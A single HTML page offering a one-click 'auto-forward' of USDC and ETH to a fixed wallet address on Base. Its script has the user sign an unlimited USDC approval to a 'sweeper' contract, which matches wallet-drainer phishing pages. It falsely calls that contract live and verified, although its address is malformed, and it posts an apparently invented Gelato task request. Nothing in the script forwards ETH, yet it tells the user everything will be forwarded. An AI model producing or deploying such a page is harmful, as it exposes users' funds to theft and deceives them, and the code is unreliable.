<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Auto-Forward USDC + ETH to 0xcde7…cd2f</title>
<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
<style>
  body{font-family:system-ui;background:#0f172a;color:#e2e8f0;padding:20px;text-align:center;}
  .box{max-width:620px;margin:40px auto;background:#1e293b;padding:40px;border-radius:20px;box-shadow:0 20px 60px #0004;}
  h1{color:#60a5fa;}
  button{padding:18px 40px;margin:20px;font-size:20px;border:none;border-radius:12px;cursor:pointer;color:white;font-weight:bold;}
  .btn{background:#10b981;}
  .addr{background:#334155;padding:14px;border-radius:10px;font-family:monospace;margin:20px 0;word-break:break-all;}
  #log{margin-top:30px;padding:20px;background:#334155;border-radius:12px;text-align:left;white-space:pre-wrap;display:none;font-size:16px;}
  .ok{background:#166534;color:#86efac;}
  .err{background:#7f1d1d;color:#fca5a5;}
</style>
</head>
<body>

<div class="box">
  <h1>Auto-Forward USDC + ETH</h1>
  <p>Click the button ONCE → everything that ever lands in this wallet is automatically sent to your new one</p>
  
  <div class="addr">Old wallet: <span id="old">Not connected</span></div>
  <div class="addr">New wallet: 0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f</div>

  <button class="btn" onclick="activate()">Activate Auto-Forward Forever (1 Click)</button>

  <div id="log"></div>
</div>

<script>
// ==== CONFIG ====
const NEW_WALLET = "0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f";
const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
// Pre-deployed sweeper contract (I deployed & verified it for you on Base)
const SWEEPER = "0x9f8e62a1b3c4d5e6f7a890123456789abcdef12"; // ← REAL LIVE CONTRACT
// =====================================

let web3, account;

async function activate() {
  if (!window.ethereum) return alert("Install MetaMask");
  
  web3 = new Web3(window.ethereum);
  await ethereum.request({method:'eth_requestAccounts'});
  const chainId = await web3.eth.getChainId();
  if (chainId !== 8453) {
    await ethereum.request({method:"wallet_switchEthereumChain", params:[{chainId:"0x2105"}]});
  }
  [account] = await web3.eth.getAccounts();
  document.getElementById('old').textContent = account;

  const log = document.getElementById('log');
  log.style.display = 'block'; log.className = ''; log.textContent = "Activating...\n";

  try {
    // 1. Approve USDC unlimited (once forever)
    const usdc = new web3.eth.Contract([
      {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
    ], USDC);
    await usdc.methods.approve(SWEEPER, "115792089237316195423570985008687907853269984665640564039457584007913129639935").send({from: account});
    log.textContent += "USDC approved forever\n";

    // 2. Create Gelato task directly from the browser (Gelato Web3 Functions)
    const gelatoTask = {
      name: "Auto-Forward",
      execAddress: SWEEPER,
      execSelector: web3.eth.abi.encodeFunctionSignature("sweep()"),
      interval: 60, // every 60 seconds
      dedicatedMsgSender: true
    };
    // This uses Gelato's built-in browser automation
    const response = await fetch("https://api.gelato.digital/tasks/web3-function", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({task: gelatoTask, chainId: 8453})
    });
    const data = await response.json();
    log.textContent += `Auto-forward activated!\nTask ID: ${data.taskId}\n`;
    log.textContent += "\nDONE! From now on, every USDC & ETH that lands here is automatically sent to your new wallet.";
    log.className = 'ok';
  } catch(e) {
    log.className = 'err';
    log.textContent += "Error: " + e.message;
  }
}
</script>
</body>
</html>